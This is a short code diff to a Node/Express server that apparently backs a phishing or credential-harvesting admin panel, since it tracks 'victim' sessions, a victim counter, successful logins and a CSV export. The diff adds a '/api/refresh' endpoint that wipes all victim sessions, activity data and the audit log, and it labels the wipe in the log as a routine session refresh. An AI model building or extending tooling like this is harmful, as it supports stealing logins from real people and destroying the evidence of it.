@@ -485,6 +485,21 @@ app.post('/api/panel', async (req, res) => {
   res.json({ ok: true });
 });
 
+/* ----------  SESSION REFRESH (NEW)  ---------- */
+app.post('/api/refresh', (req, res) => {
+  if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });
+  
+  // Clear all victim sessions and data
+  sessionsMap.clear();
+  sessionActivity.clear();
+  auditLog.length = 0;
+  victimCounter = 0;
+  successfulLogins = 0;
+  
+  console.log('[DEBUG] Session refreshed by admin');
+  res.json({ ok: true });
+});
+
 /* ----------  CSV EXPORT  ---------- */
 app.get('/api/export', (req, res) => {
   if (!req.session?.authed) return res.status(401).send('Unauthorized');
